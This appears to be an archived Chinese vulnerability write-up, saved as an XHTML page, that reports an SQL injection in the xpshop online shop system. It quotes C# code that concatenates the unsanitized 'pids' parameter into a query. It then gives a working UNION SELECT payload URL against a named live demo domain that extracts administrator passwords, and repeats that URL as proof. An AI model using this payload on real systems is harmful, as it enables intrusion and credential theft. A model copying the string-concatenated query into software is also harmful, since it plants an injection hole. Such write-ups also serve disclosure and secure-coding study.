@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>xpshop网店系统sql注入一处(官方demo演示)</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>xpshop网店系统sql注入一处(官方demo演示)</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=401913687&amp;idx=5&amp;sn=d9bae86f6c2b271315a77939c29cdcff&amp;chksm=09b5d2b33ec25ba5ec10eb34fcd0902d76388447930d95cbfeb87bb62e3339988d982ee20faa&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=401913687&amp;idx=5&amp;sn=d9bae86f6c2b271315a77939c29cdcff&amp;chksm=09b5d2b33ec25ba5ec10eb34fcd0902d76388447930d95cbfeb87bb62e3339988d982ee20faa&amp;scene=27#wechat_redirect</a></blockquote><p>
+			</p><p class="detail">漏洞位置xpshop.webui.Show:<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>private void GetImg(string pids)<br/>
+		{<br/>
+			ProductDB productDB = new ProductDB();<br/>
+			DataTable thumbnailImg = productDB.GetThumbnailImg(pids);<br/>
+			thumbnailImg.TableName = "Products";<br/>
+			base.Response.Write(XpShopJson.DtToJSON(thumbnailImg));<br/>
+		}</code></pre></fieldset><p class="detail"><br/><br/>这里是问题函数，我就不写怎么跟进来的，就是page_load,等下直接用payload测试就好了，官网demo的。<br/><br/>跟进去GetThumbnailImg函数：<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>public DataTable GetThumbnailImg(string pid)<br/>
+		{<br/>
+			string commandText = "SELECT ProductID,ProductName,ThumbnailImg,CategoryID,CategoryNo FROM Product WHERE ProductID = " + pid;<br/>
+			return XpShopDB.ExecuteDataTable(XpShopDB.ConnectionString, CommandType.Text, commandText, null);<br/>
+		}</code></pre></fieldset><p class="detail"><br/><br/>payload：<br/><br/>http://clothes.xpshop.cn/show.aspx?type=1&amp;action=GetImg&amp;pids=1 union select password,2,3,4,5 from admin--</p><p>
+						
+			</p><h3 class="detailTitle">漏洞证明：</h3><p>
+			</p><p class="detail">http://clothes.xpshop.cn/show.aspx?type=1&amp;action=GetImg&amp;pids=1 union select password,2,3,4,5 from admin--<br/><br/></p><p class="detail usemasaic"><a target="_blank"><img data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLibBoK2B6vtKHS92A6XD5oj680zyrNJFY1nP40og8hklooXmx1m6s1APVdU9G14knT9P589oKbxNPg/0?wx_fmt=jpeg" width="600" data-type="jpeg" data-ratio="0.5251798561151079" data-w="" src="../Images/0a137a1e3f12ea9a1eeca0603825032d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLibBoK2B6vtKHS92A6XD5oj680zyrNJFY1nP40og8hklooXmx1m6s1APVdU9G14knT9P589oKbxNPg/0?wx_fmt=jpeg"/></a></p><p><br/></p>
+        
+</body>
+</html>
